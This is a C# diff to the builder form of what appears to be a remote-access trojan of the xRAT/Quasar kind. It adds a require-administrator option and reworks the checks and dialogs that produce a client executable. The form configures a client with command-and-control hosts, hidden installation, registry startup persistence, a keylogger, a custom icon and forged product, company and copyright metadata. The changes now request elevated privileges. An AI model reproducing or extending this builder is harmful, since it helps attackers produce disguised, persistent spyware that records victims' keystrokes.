@@ -51,6 +51,7 @@ namespace xServer.Forms
             txtOriginalFilename.Text = profile.OriginalFilename;
             txtProductVersion.Text = profile.ProductVersion;
             txtFileVersion.Text = profile.FileVersion;
+            chkRequireAdministrator.Checked = profile.RequireAdministrator;
 
             _profileLoaded = true;
         }
@@ -67,6 +68,7 @@ namespace xServer.Forms
             profile.InstallClient = chkInstall.Checked;
             profile.InstallName = txtInstallname.Text;
             profile.InstallPath = GetInstallPath();
+            profile.InstallSub = txtInstallsub.Text;
             profile.HideFile = chkHide.Checked;
             profile.AddStartup = chkStartup.Checked;
             profile.RegistryName = txtRegistryKeyName.Text;
@@ -81,6 +83,7 @@ namespace xServer.Forms
             profile.OriginalFilename = txtOriginalFilename.Text;
             profile.ProductVersion = txtProductVersion.Text;
             profile.FileVersion = txtFileVersion.Text;
+            profile.RequireAdministrator = chkRequireAdministrator.Checked;
         }
 
         private void FrmBuilder_Load(object sender, EventArgs e)
@@ -211,14 +214,10 @@ namespace xServer.Forms
 
         private void btnBuild_Click(object sender, EventArgs e)
         {
-            if (lstHosts.Items.Count > 0 &&
-                !string.IsNullOrEmpty(txtDelay.Text) && // Connection Information
-                !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtMutex.Text) && // Client Options
-                !chkInstall.Checked ||
-                (chkInstall.Checked && !string.IsNullOrEmpty(txtInstallname.Text) &&
-                 !string.IsNullOrEmpty(txtInstallsub.Text)) && // Installation Options
-                !chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrEmpty(txtRegistryKeyName.Text)))
-                // Persistence and Registry Features
+            if (!string.IsNullOrEmpty(txtTag.Text) && !string.IsNullOrEmpty(txtMutex.Text) && // General Settings
+                lstHosts.Items.Count > 0 && !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtDelay.Text) && // Connection
+                !chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrEmpty(txtInstallname.Text)) && // Installation
+                !chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrEmpty(txtRegistryKeyName.Text))) // Installation
             {
                 string output = string.Empty;
                 string icon = string.Empty;
@@ -227,6 +226,7 @@ namespace xServer.Forms
                 {
                     using (OpenFileDialog ofd = new OpenFileDialog())
                     {
+                        ofd.Title = "Choose Icon";
                         ofd.Filter = "Icons *.ico|*.ico";
                         ofd.Multiselect = false;
                         if (ofd.ShowDialog() == DialogResult.OK)
@@ -236,62 +236,72 @@ namespace xServer.Forms
 
                 using (SaveFileDialog sfd = new SaveFileDialog())
                 {
-                    sfd.Filter = "EXE Files *.exe|*.exe";
+                    sfd.Title = "Save Client as";
+                    sfd.Filter = "Executables *.exe|*.exe";
                     sfd.RestoreDirectory = true;
                     sfd.FileName = "Client-built.exe";
-                    if (sfd.ShowDialog() == DialogResult.OK)
-                        output = sfd.FileName;
+                    if (sfd.ShowDialog() != DialogResult.OK) return;
+                    output = sfd.FileName;
                 }
 
-                if (!string.IsNullOrEmpty(output) && (!chkIconChange.Checked || !string.IsNullOrEmpty(icon)))
+                if (string.IsNullOrEmpty(output))
                 {
-                    try
-                    {
-                        string[] asmInfo = null;
-                        if (chkChangeAsmInfo.Checked)
-                        {
-                            if (!FormatHelper.IsValidVersionNumber(txtProductVersion.Text) ||
-                                !FormatHelper.IsValidVersionNumber(txtFileVersion.Text))
-                            {
-                                MessageBox.Show("Please enter a valid version number!\nExample: 1.0.0.0", "Builder",
-                                    MessageBoxButtons.OK, MessageBoxIcon.Information);
-                                return;
-                            }
+                    MessageBox.Show("Please choose a valid output path.", "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    return;
+                }
 
-                            asmInfo = new string[8];
-                            asmInfo[0] = txtProductName.Text;
-                            asmInfo[1] = txtDescription.Text;
-                            asmInfo[2] = txtCompanyName.Text;
-                            asmInfo[3] = txtCopyright.Text;
-                            asmInfo[4] = txtTrademarks.Text;
-                            asmInfo[5] = txtOriginalFilename.Text;
-                            asmInfo[6] = txtProductVersion.Text;
-                            asmInfo[7] = txtFileVersion.Text;
+                if (chkIconChange.Checked && string.IsNullOrEmpty(icon))
+                {
+                    MessageBox.Show("Please choose a valid icon path.", "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    return;
+                }
+
+                try
+                {
+                    string[] asmInfo = null;
+                    if (chkChangeAsmInfo.Checked)
+                    {
+                        if (!FormatHelper.IsValidVersionNumber(txtProductVersion.Text) ||
+                            !FormatHelper.IsValidVersionNumber(txtFileVersion.Text))
+                        {
+                            MessageBox.Show("Please enter a valid version number!\nExample: 1.0.0.0", "Build failed",
+                                MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            return;
                         }
 
-                        ClientBuilder.Build(output, txtTag.Text, HostHelper.GetRawHosts(_hosts), txtPassword.Text, txtInstallsub.Text,
-                            txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked,
-                            chkHide.Checked, chkKeylogger.Checked, int.Parse(txtDelay.Text), GetInstallPath(), icon, asmInfo,
-                            Application.ProductVersion);
+                        asmInfo = new string[8];
+                        asmInfo[0] = txtProductName.Text;
+                        asmInfo[1] = txtDescription.Text;
+                        asmInfo[2] = txtCompanyName.Text;
+                        asmInfo[3] = txtCopyright.Text;
+                        asmInfo[4] = txtTrademarks.Text;
+                        asmInfo[5] = txtOriginalFilename.Text;
+                        asmInfo[6] = txtProductVersion.Text;
+                        asmInfo[7] = txtFileVersion.Text;
+                    }
 
-                        MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK,
-                            MessageBoxIcon.Information);
-                    }
-                    catch (FileLoadException)
-                    {
-                        MessageBox.Show("Unable to load the Client Assembly Information.\nPlease re-build the Client.",
-                            "Error loading Client", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(
-                            string.Format("An error occurred!\n\nError Message: {0}\nStack Trace:\n{1}", ex.Message,
-                                ex.StackTrace), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    }
+                    ClientBuilder.Build(output, txtTag.Text, HostHelper.GetRawHosts(_hosts), txtPassword.Text, txtInstallsub.Text,
+                        txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked,
+                        chkHide.Checked, chkKeylogger.Checked, int.Parse(txtDelay.Text), GetInstallPath(), icon, asmInfo,
+                        Application.ProductVersion, chkRequireAdministrator.Checked);
+
+                    MessageBox.Show("Successfully built client!", "Build Success", MessageBoxButtons.OK,
+                        MessageBoxIcon.Information);
+                }
+                catch (FileLoadException)
+                {
+                    MessageBox.Show("Unable to load the Client Assembly Information.\nPlease re-build the Client.",
+                        "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(
+                        string.Format("An error occurred!\n\nError Message: {0}\nStack Trace:\n{1}", ex.Message,
+                            ex.StackTrace), "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
             }
             else
-                MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK,
+                MessageBox.Show("Please fill out all required fields!", "Build failed", MessageBoxButtons.OK,
                     MessageBoxIcon.Information);
         }
 
